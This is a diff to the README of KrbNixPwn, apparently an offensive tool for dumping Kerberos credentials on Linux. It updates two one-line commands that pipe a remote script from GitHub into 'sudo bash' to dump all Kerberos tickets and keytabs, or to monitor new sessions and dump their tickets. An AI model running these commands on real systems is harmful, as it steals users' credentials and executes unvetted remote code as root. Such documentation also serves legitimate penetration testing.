@@ -6,11 +6,11 @@
 #### TL;DR — Using KrbNixPwn
 **Dump all Kerberos tickets and keytab files on the machine (requires root privileges):**
 
-    curl -sSL https://raw.githubusercontent.com/onSec-fr/KrbNixPwn/refs/heads/master/KrbNixPwn.sh | sudo bash -s -- dump
+    curl -sSL https://raw.githubusercontent.com/onSec-fr/KrbNixPwn/refs/heads/main/KrbNixPwn.sh | sudo bash -s -- dump
     
 **Monitor and automatically dump Kerberos tickets from new user sessions (requires root privileges):**
 
-    curl -sSL https://raw.githubusercontent.com/onSec-fr/KrbNixPwn/refs/heads/master/KrbNixPwn.sh | sudo bash -s -- monitor
+    curl -sSL https://raw.githubusercontent.com/onSec-fr/KrbNixPwn/refs/heads/main/KrbNixPwn.sh| sudo bash -s -- monitor
 ------------
 
 - [Motivation](#motivation)
